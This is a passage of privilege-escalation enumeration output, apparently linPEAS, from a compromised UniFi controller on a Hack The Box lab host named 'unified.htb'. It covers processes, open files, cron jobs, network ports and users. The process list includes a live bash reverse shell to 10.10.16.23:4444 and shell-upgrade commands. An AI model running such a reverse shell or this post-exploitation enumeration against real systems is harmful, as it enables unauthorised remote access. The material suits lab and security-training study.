    └─ /usr/lib/unifi/lib/owasp-java-html-sanitizer-20190503.1.jar
    └─ /usr/lib/unifi/lib/postgresql-42.2.8.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/sunjce_provider.jar
    └─ /usr/lib/unifi/lib/proto-google-common-protos-1.12.0.jar
    └─ /usr/lib/unifi/lib/proto-google-iam-v1-0.12.0.jar
    └─ /usr/lib/unifi/lib/protobuf-java-3.6.0.jar
    └─ /usr/lib/unifi/lib/protobuf-java-util-3.6.0.jar
    └─ /usr/lib/unifi/lib/radclient4.jar
    └─ /usr/lib/unifi/lib/reactive-streams-1.0.3.jar
    └─ /usr/lib/unifi/lib/reactor-core-3.4.0.jar
    └─ /usr/lib/unifi/lib/servo-aws-0.13.0.jar
    └─ /usr/lib/unifi/lib/servo-core-0.13.0.jar
    └─ /usr/lib/unifi/lib/servo-graphite-0.13.0.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/zipfs.jar
    └─ /usr/lib/unifi/lib/slf4j-api-1.7.30.jar
    └─ /usr/lib/unifi/lib/snappy-java-1.1.7.5.jar
    └─ /usr/lib/unifi/lib/spectator-api-0.88.0.jar
    └─ /usr/lib/unifi/lib/spqr-0.10.1.jar
    └─ /usr/lib/unifi/lib/spring-aop-5.3.7.jar
    └─ /usr/lib/unifi/lib/spring-beans-5.3.7.jar
    └─ /usr/lib/unifi/lib/spring-context-5.3.7.jar
    └─ /usr/lib/unifi/lib/spring-core-5.3.7.jar
    └─ /usr/lib/unifi/lib/spring-data-commons-1.13.23.RELEASE.jar
    └─ /usr/lib/unifi/lib/spring-data-mongodb-1.10.23.RELEASE.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/cldrdata.jar
    └─ /usr/lib/unifi/lib/spring-expression-5.3.7.jar
    └─ /usr/lib/unifi/lib/spring-plugin-core-1.2.0.RELEASE.jar
    └─ /usr/lib/unifi/lib/spring-plugin-metadata-1.2.0.RELEASE.jar
    └─ /usr/lib/unifi/lib/spring-test-5.3.7.jar
    └─ /usr/lib/unifi/lib/spring-tx-5.3.7.jar
    └─ /usr/lib/unifi/lib/spring-web-5.3.7.jar
    └─ /usr/lib/unifi/lib/spring-webmvc-5.3.7.jar
    └─ /usr/lib/unifi/lib/spring-websocket-5.3.7.jar
    └─ /usr/lib/unifi/lib/springfox-core-2.9.2.jar
    └─ /usr/lib/unifi/lib/springfox-schema-2.9.2.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/nashorn.jar
    └─ /usr/lib/unifi/lib/springfox-spi-2.9.2.jar
    └─ /usr/lib/unifi/lib/springfox-spring-web-2.9.2.jar
    └─ /usr/lib/unifi/lib/springfox-swagger-common-2.9.2.jar
    └─ /usr/lib/unifi/lib/springfox-swagger-ui-2.9.2.jar
    └─ /usr/lib/unifi/lib/springfox-swagger2-2.9.2.jar
    └─ /usr/lib/unifi/lib/sshj-0.27.0.jar
    └─ /usr/lib/unifi/lib/swagger-annotations-1.5.20.jar
    └─ /usr/lib/unifi/lib/swagger-models-1.5.20.jar
    └─ /usr/lib/unifi/lib/tomcat-annotations-api-8.5.56.jar
    └─ /usr/lib/unifi/lib/tomcat-embed-core-8.5.56.jar
    └─ /usr/lib/unifi/lib/ace.jar
    └─ /usr/lib/unifi/lib/tomcat-embed-el-8.5.56.jar
    └─ /usr/lib/unifi/lib/tomcat-embed-jasper-8.5.56.jar
    └─ /usr/lib/unifi/lib/tomcat-embed-logging-juli-8.5.2.jar
    └─ /usr/lib/unifi/lib/tomcat-embed-logging-log4j-8.5.2.jar
    └─ /usr/lib/unifi/lib/tomcat-embed-websocket-8.5.56.jar
    └─ /usr/lib/unifi/lib/urlrewritefilter-4.0.4.jar
    └─ /unifi/log/server.log
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar
    └─ /usr/lib/unifi/lib/analytics-api-1.2.1.jar
    └─ /dev/random
    └─ /dev/urandom
    └─ pipe:[24708]
    └─ /usr/lib/unifi/lib/analytics-client-1.2.1.jar
    └─ pipe:[24705]
    └─ pipe:[24707]
    └─ pipe:[24709]
    └─ /usr/lib/unifi/lib/analytics-privacy-1.2.1.jar
    └─ pipe:[24712]
    └─ pipe:[24713]
    └─ /usr/lib/unifi/lib/animal-sniffer-annotations-1.17.jar
    └─ pipe:[24714]
    └─ pipe:[24716]
    └─ pipe:[24718]
    └─ pipe:[25615]
    └─ /usr/lib/unifi/lib/annotations-3.0.1.jar
    └─ pipe:[24719]
    └─ pipe:[24720]
    └─ pipe:[24721]
    └─ /usr/lib/unifi/lib/antlr4-runtime-4.7.2.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar
    └─ pipe:[24734]
    └─ pipe:[24735]
    └─ /usr/lib/unifi/lib/api-common-1.7.0.jar
    └─ pipe:[25891]
    └─ /usr/lib/unifi/lib/apigateway-generic-java-sdk-1.3.jar
    └─ /usr/lib/unifi/lib/auto-value-1.6.2.jar
    └─ pipe:[33677]
    └─ pipe:[33678]
    └─ pipe:[33679]
    └─ /usr/lib/unifi/lib/aws-iot-device-sdk-java-1.2.0.jar
    └─ /usr/lib/unifi/lib/aws-java-sdk-cloudwatch-1.11.409.jar
    └─ /usr/lib/unifi/lib/aws-java-sdk-core-1.11.409.jar
    └─ /usr/lib/unifi/lib/aws-java-sdk-s3-1.11.409.jar
    └─ /usr/lib/unifi/lib/bcpkix-jdk15on-1.60.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar
    └─ /usr/lib/unifi/lib/bcprov-jdk15on-1.60.jar
    └─ /usr/lib/unifi/lib/byte-buddy-1.8.12.jar
    └─ /usr/lib/unifi/lib/checker-qual-2.5.2.jar
    └─ /usr/lib/unifi/lib/classgraph-4.8.59.jar
    └─ /usr/lib/unifi/lib/classmate-1.4.0.jar
    └─ /usr/lib/unifi/lib/coloring-1.0.jar
    └─ /usr/lib/unifi/lib/commons-beanutils-1.9.2.jar
    └─ /usr/lib/unifi/lib/commons-codec-1.11.jar
    └─ /usr/lib/unifi/lib/commons-dbcp2-2.7.0.jar
    └─ /usr/lib/unifi/lib/commons-httpclient-3.1-atlassian-2.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar
    └─ /usr/lib/unifi/lib/commons-httpclient-contrib-3.1.jar
    └─ /usr/lib/unifi/lib/commons-io-2.6.jar
    └─ /usr/lib/unifi/lib/commons-lang3-3.10.jar
    └─ /usr/lib/unifi/lib/commons-logging-1.2.jar
    └─ /usr/lib/unifi/lib/commons-net-3.6.jar
    └─ /usr/lib/unifi/lib/commons-pool2-2.7.0.jar
    └─ /usr/lib/unifi/lib/commons-text-1.8.jar
    └─ /usr/lib/unifi/lib/commons-validator-1.6.jar
    └─ /usr/lib/unifi/lib/compiler-0.9.6.jar
    └─ /usr/lib/unifi/lib/cron4j-2.2.5.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/dnsns.jar
    └─ /usr/lib/unifi/lib/dom4j-1.6.1.jar
    └─ /usr/lib/unifi/lib/ecj-4.6.1.jar
    └─ /usr/lib/unifi/lib/eddsa-0.2.0.jar
    └─ /usr/lib/unifi/lib/error_prone_annotations-2.2.0.jar
    └─ /usr/lib/unifi/lib/failureaccess-1.0.1.jar
    └─ /usr/lib/unifi/lib/gax-1.31.0.jar
    └─ /usr/lib/unifi/lib/geantyref-1.3.11.jar
    └─ /usr/lib/unifi/lib/google-api-client-1.26.0.jar
    └─ /usr/lib/unifi/lib/google-api-services-drive-v3-rev20180830-1.26.0.jar
    └─ /usr/lib/unifi/lib/google-api-services-storage-v1-rev135-1.24.1.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/jaccess.jar
    └─ /usr/lib/unifi/lib/google-auth-library-credentials-0.11.0.jar
    └─ /usr/lib/unifi/lib/google-auth-library-oauth2-http-0.11.0.jar
    └─ /usr/lib/unifi/lib/google-cloud-core-1.44.0.jar
    └─ /usr/lib/unifi/lib/google-cloud-core-http-1.44.0.jar
    └─ /usr/lib/unifi/lib/google-cloud-storage-1.44.0.jar
    └─ /usr/lib/unifi/lib/google-http-client-1.26.0.jar
    └─ /usr/lib/unifi/lib/google-http-client-appengine-1.24.1.jar
    └─ /usr/lib/unifi/lib/google-http-client-gson-1.26.0.jar
    └─ /usr/lib/unifi/lib/google-http-client-jackson-1.24.1.jar
    └─ /usr/lib/unifi/lib/google-http-client-jackson2-1.26.0.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/sunpkcs11.jar
    └─ /usr/lib/unifi/lib/google-http-client-jdo-1.26.0.jar
    └─ /usr/lib/unifi/lib/google-oauth-client-1.26.0.jar
    └─ /usr/lib/unifi/lib/graphql-java-13.0.jar
    └─ /usr/lib/unifi/lib/gson-2.8.5.jar
    └─ /usr/lib/unifi/lib/gson-java8-datatype-1.1.0.jar
    └─ /usr/lib/unifi/lib/guava-27.1-jre.jar
    └─ /usr/lib/unifi/lib/hibernate-validator-6.1.2.Final.jar
    └─ /usr/lib/unifi/lib/httpclient-4.5.10.jar
    └─ /usr/lib/unifi/lib/httpcore-4.4.12.jar
    └─ /usr/lib/unifi/lib/j2objc-annotations-1.1.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/localedata.jar
    └─ /usr/lib/unifi/lib/jackson-annotations-2.11.0.jar
    └─ /usr/lib/unifi/lib/jackson-core-2.11.0.jar
    └─ /usr/lib/unifi/lib/jackson-databind-2.11.0.jar
    └─ /usr/lib/unifi/lib/jackson-datatype-jdk8-2.11.0.jar
    └─ /usr/lib/unifi/lib/jackson-datatype-jsr310-2.10.1.jar
    └─ /usr/lib/unifi/lib/jackson-module-parameter-names-2.10.1.jar
    └─ /usr/lib/unifi/lib/jakarta.validation-api-2.0.2.jar
    └─ /usr/lib/unifi/lib/java-dataloader-2.1.1.jar
    └─ /usr/lib/unifi/lib/java-ipv6-0.17.jar
    └─ /usr/lib/unifi/lib/java-semver-0.9.0.jar
    └─ /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext/icedtea-sound.jar
    └─ /usr/lib/unifi/lib/javax.mail-1.6.2.jar
    └─ /usr/lib/unifi/lib/jboss-logging-3.3.2.Final.jar
    └─ /usr/lib/unifi/lib/jcl-over-slf4j-1.7.30.jar
    └─ /usr/lib/unifi/lib/jenetics-4.2.0.jar
    └─ /usr/lib/unifi/lib/jmdns-3.4.1.jar
    └─ /usr/lib/unifi/lib/joda-time-2.10.4.jar
    └─ /usr/lib/unifi/lib/jorbis-0.0.17.jar
    └─ /usr/lib/unifi/lib/json-20190722.jar
    └─ /usr/lib/unifi/lib/jsr305-3.0.2.jar
    └─ /usr/lib/unifi/lib/jstl-1.2.jar
Process 67 (unifi) - bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logR
  └─ Has open files:
    └─ pipe:[24734]
    └─ pipe:[24735]
    └─ /unifi/data/db/index-92-4495969142330236937.wt
    └─ /unifi/data/db/index-25-4495969142330236937.wt
    └─ /unifi/data/db/index-24-4495969142330236937.wt
    └─ /unifi/data/db/index-23-4495969142330236937.wt
    └─ /unifi/data/db/index-103-4495969142330236937.wt
    └─ /unifi/data/db/index-89-4495969142330236937.wt
    └─ /unifi/data/db/index-266-4495969142330236937.wt
    └─ /unifi/data/db/index-227-4495969142330236937.wt
    └─ /unifi/data/db/index-224-4495969142330236937.wt
    └─ /unifi/data/db/index-223-4495969142330236937.wt
    └─ /unifi/data/db/index-231-4495969142330236937.wt
    └─ /unifi/data/db/index-228-4495969142330236937.wt
    └─ /unifi/data/db/index-235-4495969142330236937.wt
    └─ /unifi/data/db/index-232-4495969142330236937.wt
    └─ /unifi/data/db/index-236-4495969142330236937.wt
    └─ /unifi/data/db/index-127-4495969142330236937.wt
    └─ /unifi/data/db/index-125-4495969142330236937.wt
    └─ /unifi/data/db/index-129-4495969142330236937.wt
    └─ /unifi/data/db/index-124-4495969142330236937.wt
    └─ /unifi/data/db/index-216-4495969142330236937.wt
    └─ /unifi/data/db/index-126-4495969142330236937.wt
    └─ /unifi/data/db/index-128-4495969142330236937.wt
    └─ /unifi/data/db/index-116-4495969142330236937.wt
    └─ /unifi/data/db/index-50-4495969142330236937.wt
    └─ /unifi/data/db/WiredTiger.lock
    └─ /unifi/data/db/index-14-4495969142330236937.wt
    └─ /unifi/data/db/index-81-4495969142330236937.wt
    └─ /unifi/data/db/index-195-4495969142330236937.wt
    └─ /unifi/data/db/index-196-4495969142330236937.wt
    └─ /unifi/data/db/index-186-4495969142330236937.wt
    └─ /unifi/data/db/index-187-4495969142330236937.wt
    └─ /unifi/data/db/index-190-4495969142330236937.wt
    └─ /unifi/data/db/index-240-4495969142330236937.wt
    └─ /unifi/data/db/index-244-4495969142330236937.wt
    └─ /unifi/data/db/index-247-4495969142330236937.wt
    └─ /unifi/data/db/WiredTiger.wt
    └─ /unifi/data/db/index-252-4495969142330236937.wt
    └─ /unifi/data/db/index-253-4495969142330236937.wt
    └─ /unifi/data/db/index-256-4495969142330236937.wt
    └─ /unifi/data/db/index-152-4495969142330236937.wt
    └─ /unifi/data/db/index-17-4495969142330236937.wt
    └─ /unifi/data/db/index-110-4495969142330236937.wt
    └─ /unifi/data/db/index-78-4495969142330236937.wt
    └─ /unifi/data/db/index-99-4495969142330236937.wt
    └─ /unifi/data/db/index-67-4495969142330236937.wt
    └─ /unifi/data/db/index-106-4495969142330236937.wt
    └─ /unifi/data/db/journal
    └─ /unifi/data/db/index-173-4495969142330236937.wt
    └─ /unifi/data/db/index-71-4495969142330236937.wt
    └─ /unifi/data/db/index-136-4495969142330236937.wt
    └─ /unifi/data/db/journal/WiredTigerLog.0000000012
    └─ /unifi/data/db/_mdb_catalog.wt
    └─ /unifi/data/db/WiredTigerLAS.wt
    └─ /unifi/data/db/sizeStorer.wt
    └─ pipe:[24736]
    └─ /unifi/data/db/collection-201-4495969142330236937.wt
    └─ /unifi/data/db/collection-91-4495969142330236937.wt
    └─ /unifi/data/db/collection-114-4495969142330236937.wt
    └─ /unifi/data/db/collection-214-4495969142330236937.wt
    └─ /unifi/data/db/collection-248-4495969142330236937.wt
    └─ /unifi/data/db/collection-178-4495969142330236937.wt
    └─ /unifi/data/db/collection-31-4495969142330236937.wt
    └─ /unifi/data/db/collection-212-4495969142330236937.wt
    └─ /unifi/data/db/collection-87-4495969142330236937.wt
    └─ /unifi/data/db/collection-69-4495969142330236937.wt
    └─ /dev/urandom
    └─ /unifi/data/db/collection-51-4495969142330236937.wt
    └─ /unifi/data/db/collection-206-4495969142330236937.wt
    └─ /unifi/data/db/collection-171-4495969142330236937.wt
    └─ /unifi/data/db/collection-123-4495969142330236937.wt
    └─ /unifi/data/db/collection-111-4495969142330236937.wt
    └─ /unifi/data/db/collection-57-4495969142330236937.wt
    └─ /unifi/data/db/collection-119-4495969142330236937.wt
    └─ /unifi/data/db/collection-79-4495969142330236937.wt
    └─ /unifi/data/db/collection-4-4495969142330236937.wt
    └─ /unifi/data/db/collection-157-4495969142330236937.wt
    └─ /unifi/data/db/collection-168-4495969142330236937.wt
    └─ /unifi/data/db/collection-61-4495969142330236937.wt
    └─ /unifi/data/db/collection-174-4495969142330236937.wt
    └─ /unifi/data/db/collection-154-4495969142330236937.wt
    └─ /unifi/data/db/collection-134-4495969142330236937.wt
    └─ /unifi/data/db/collection-181-4495969142330236937.wt
    └─ /unifi/data/db/collection-15-4495969142330236937.wt
    └─ /unifi/data/db/collection-26-4495969142330236937.wt
    └─ /unifi/data/db/collection-145-4495969142330236937.wt
    └─ /unifi/data/db/collection-108-4495969142330236937.wt
    └─ /unifi/log/mongod.log
    └─ /unifi/data/db/collection-65-4495969142330236937.wt
    └─ /unifi/data/db/collection-94-4495969142330236937.wt
    └─ /unifi/data/db/collection-97-4495969142330236937.wt
    └─ /unifi/data/db/collection-44-4495969142330236937.wt
    └─ /unifi/data/db/collection-19-4495969142330236937.wt
    └─ /unifi/data/db/collection-104-4495969142330236937.wt
    └─ /unifi/data/db/collection-101-4495969142330236937.wt
    └─ /unifi/data/db/collection-22-4495969142330236937.wt
    └─ /unifi/data/db/collection-161-4495969142330236937.wt
    └─ /unifi/data/db/collection-37-4495969142330236937.wt
    └─ /unifi/data/db/collection-165-4495969142330236937.wt
    └─ /unifi/data/db/collection-137-4495969142330236937.wt
    └─ /unifi/data/db/collection-209-4495969142330236937.wt
    └─ /unifi/data/db/collection-262-4495969142330236937.wt
    └─ /unifi/data/db/collection-34-4495969142330236937.wt
    └─ /unifi/data/db/collection-72-4495969142330236937.wt
    └─ /unifi/data/db/collection-184-4495969142330236937.wt
    └─ /unifi/data/db/collection-76-4495969142330236937.wt
    └─ /unifi/data/db/collection-40-4495969142330236937.wt
    └─ /unifi/data/db/collection-54-4495969142330236937.wt
    └─ /unifi/data/db/mongod.lock
    └─ /unifi/data/db/collection-9-4495969142330236937.wt
    └─ /unifi/data/db/collection-197-4495969142330236937.wt
    └─ /unifi/data/db/collection-257-4495969142330236937.wt
    └─ /unifi/data/db/collection-148-4495969142330236937.wt
    └─ /unifi/data/db/collection-130-4495969142330236937.wt
    └─ /unifi/data/db/collection-254-4495969142330236937.wt
    └─ /unifi/data/db/collection-251-4495969142330236937.wt
    └─ /unifi/data/db/collection-221-4495969142330236937.wt
    └─ /unifi/data/db/collection-241-4495969142330236937.wt
    └─ /unifi/data/db/collection-229-4495969142330236937.wt
    └─ /unifi/data/db/collection-245-4495969142330236937.wt
    └─ /unifi/data/db/collection-225-4495969142330236937.wt
    └─ /unifi/data/db/collection-237-4495969142330236937.wt
    └─ /unifi/data/db/collection-217-4495969142330236937.wt
    └─ /unifi/data/db/collection-233-4495969142330236937.wt
    └─ /unifi/data/db/collection-0-4495969142330236937.wt
    └─ /unifi/data/db/collection-264-4495969142330236937.wt
    └─ /unifi/data/db/collection-2-4495969142330236937.wt
    └─ /unifi/data/db/index-1-4495969142330236937.wt
    └─ /unifi/data/db/index-3-4495969142330236937.wt
    └─ /unifi/data/db/diagnostic.data/metrics.2025-08-23T19-46-46Z-00000
    └─ /unifi/data/db/index-164-4495969142330236937.wt
Process 1128 (unifi) - bash -c 0<&155-;exec 155<>/dev/tcp/10.10.16.23/4444;sh <&155 >&155 2>&155 
  └─ Has open files:
    └─ pipe:[33677]
    └─ pipe:[33678]
    └─ pipe:[33679]
Process 1563 (unifi) - /usr/bin/script /dev/null 
  └─ Has open files:
    └─ /dev/pts/ptmx
    └─ /dev/pts/0
Process 1564 (unifi) - sh -i 
  └─ Has open files:
    └─ /dev/pts/0
    └─ /dev/tty
Process 1752 (unifi) - /bin/bash -i 
  └─ Has open files:
    └─ /dev/pts/0
Process 1807 (unifi) - bash -i 
  └─ Has open files:
    └─ /dev/tty

╔══════════╣ Processes with memory-mapped credential files
                                                                                                                                                             
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                    
                                                                                                                                                             
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                           
                                                                                                                                                             
╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                         
══╣ Cron jobs list                                                                                                                                           
/usr/bin/crontab                                                                                                                                             
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab                                                                                                     

/etc/cron.d:
total 12
drwxr-xr-x 2 root root 4096 Jan  2  2022 .
drwxr-xr-x 1 root root 4096 Aug 23 20:46 ..
-rw-r--r-- 1 root root  102 Nov 16  2017 .placeholder

/etc/cron.daily:
total 28
drwxr-xr-x 1 root root 4096 Jan  2  2022 .
drwxr-xr-x 1 root root 4096 Aug 23 20:46 ..
-rw-r--r-- 1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x 1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x 1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x 1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x 1 root root  249 Jan 25  2018 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x 2 root root 4096 Jan  2  2022 .
drwxr-xr-x 1 root root 4096 Aug 23 20:46 ..
-rw-r--r-- 1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x 2 root root 4096 Jan  2  2022 .
drwxr-xr-x 1 root root 4096 Aug 23 20:46 ..
-rw-r--r-- 1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 12
drwxr-xr-x 2 root root 4096 Jan  2  2022 .
drwxr-xr-x 1 root root 4096 Aug 23 20:46 ..
-rw-r--r-- 1 root root  102 Nov 16  2017 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

══╣ Checking for specific cron jobs vulnerabilities
Checking cron directories...                                                                                                                                 

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                     
══╣ Active timers:                                                                                                                                           
══╣ Disabled timers:                                                                                                                                         
══╣ Additional timer files:                                                                                                                                  
                                                                                                                                                             
╔══════════╣ Services and Service Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                   
                                                                                                                                                             
══╣ Active services:
                                                                                                                                                             
══╣ Disabled services:
                                                                                                                                                             
══╣ Additional service files:
You can't write on systemd PATH                                                                                                                              

╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                              
═╣ Systemd version and vulnerabilities? .............. systemctl Not Found                                                                                   
═╣ Services running as root? ..... systemctl Not Found                                                                                                       
                                                                                                                                                             
═╣ Running services with dangerous capabilities? ... systemctl Not Found
                                                                                                                                                             
═╣ Services with writable paths? . systemctl Not Found
                                                                                                                                                             

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                              
systemctl Not Found                                                                                                                                          
                                                                                                                                                             
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                    
                                                                                                                                                             
╔══════════╣ Unix Sockets Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                    
/run/unifi/mongodb-27117.sock                                                                                                                                
  └─(Read Write Execute )

╔══════════╣ D-Bus Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                      
busctl Not Found                                                                                                                                             
                                                                                                                                                             


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                          
                              ╚═════════════════════╝                                                                                                        
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                          
link-local 169.254.0.0
Network Interfaces from /proc/net/dev:
----------------------------------------
Interface: lo
  MAC: 00:00:00:00:00:00
  State: unknown

Interface: docker0
  MAC: 02:42:9d:a2:26:1e
  State: down

Interface: ens160
  MAC: 00:50:56:b0:60:f1
  State: up

Additional IP Information from fib_trie:
----------------------------------------
Network: 

╔══════════╣ Hostname, hosts and DNS
══╣ Hostname Information                                                                                                                                     
System hostname: unified                                                                                                                                     
FQDN: unified

══╣ Hosts File Information
Contents of /etc/hosts:                                                                                                                                      
  127.0.0.1 localhost
  127.0.1.1 unified unified.htb
  ::1     ip6-localhost ip6-loopback
  fe00::0 ip6-localnet
  ff00::0 ip6-mcastprefix
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters

══╣ DNS Configuration
DNS Servers (resolv.conf):                                                                                                                                   
  127.0.0.53
-e 
DNS Domain Information:
(none)

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                 
══╣ Active tcp Ports (from /proc/net/tcp)                                                                                                                    
Proto  Recv-Q  Send-Q  Local Address          Foreign Address        State       PID/Program name                                                            
--------------------------------------------------------------------------------
tcp    00:00000000 00000000:00000000 127.0.0.1:27117       0.0.0.0:0             LISTEN       67/mongod
tcp    00:00000000 00000000:00000000 127.0.0.53:53         0.0.0.0:0             LISTEN       /
tcp    00:00000000 00000000:00000000 0.0.0.0:22            0.0.0.0:0             LISTEN       /

══╣ Active udp Ports (from /proc/net/udp)
Proto  Recv-Q  Send-Q  Local Address          Foreign Address        State       PID/Program name                                                            
--------------------------------------------------------------------------------


╔══════════╣ Network Traffic Analysis Capabilities
                                                                                                                                                             
══╣ Available Sniffing Tools
No sniffing tools found                                                                                                                                      

══╣ Network Interfaces Sniffing Capabilities
Interface docker0: Not sniffable                                                                                                                             
Interface ens160: Not sniffable
No sniffable interfaces found

╔══════════╣ Firewall Rules Analysis
                                                                                                                                                             
══╣ Iptables Rules
iptables Not Found                                                                                                                                           
                                                                                                                                                             
══╣ Nftables Rules
nftables Not Found                                                                                                                                           
                                                                                                                                                             
══╣ Firewalld Rules
firewalld Not Found                                                                                                                                          
                                                                                                                                                             
══╣ UFW Rules
ufw Not Found                                                                                                                                                
                                                                                                                                                             
╔══════════╣ Inetd/Xinetd Services Analysis
                                                                                                                                                             
══╣ Inetd Services
inetd Not Found                                                                                                                                              
                                                                                                                                                             
══╣ Xinetd Services
xinetd Not Found                                                                                                                                             
                                                                                                                                                             
══╣ Running Inetd/Xinetd Services
-e                                                                                                                                                           
Running Service Processes:

╔══════════╣ Internet Access?
  ping not found                                                                                                                                             
Port 443 is not accessible
DNS is not accessible
Port 80 is not accessible
Port 443 is not accessible with curl



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                          
                               ╚═══════════════════╝                                                                                                         
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                      
uid=999(unifi) gid=999(unifi) groups=999(unifi)                                                                                                              

╔══════════╣ PGP Keys and Related Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys                                                                   
GPG:                                                                                                                                                         
GPG is installed, listing keys:
-e 
NetPGP:
netpgpkeys Not Found
-e                                                                                                                                                           
PGP Related Files:

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                              
                                                                                                                                                             

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                        
ptrace protection is enabled (1)                                                                                                                             

doas.conf Not Found
                                                                                                                                                             
╔══════════╣ Checking Pkexec and Polkit
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                  
                                                                                                                                                             
══╣ Polkit Binary
                                                                                                                                                             
══╣ Polkit Policies
                                                                                                                                                             
══╣ Polkit Authentication Agent
                                                                                                                                                             
╔══════════╣ Superusers and UID 0 Users
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html                                                
                                                                                                                                                             
══╣ Users with UID 0 in /etc/passwd
root:x:0:0:root:/root:/bin/bash                                                                                                                              

══╣ Users with sudo privileges in sudoers
                                                                                                                                                             
╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                              
unifi:x:999:999::/home/unifi:/bin/sh

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                       
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=101(mongodb) gid=102(mongodb) groups=102(mongodb)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=999(unifi) gid=999(unifi) groups=999(unifi)

╔══════════╣ Currently Logged in Users
                                                                                                                                                             
══╣ Basic user information
 22:00:06 up  1:14,  0 users,  load average: 0.14, 0.03, 0.01                                                                                                
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Active sessions
 22:00:06 up  1:14,  0 users,  load average: 0.14, 0.03, 0.01                                                                                                
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Logged in users (utmp)
                                                                                                                                                             
══╣ SSH sessions
                                                                                                                                                             
══╣ Screen sessions
                                                                                                                                                             
══╣ Tmux sessions
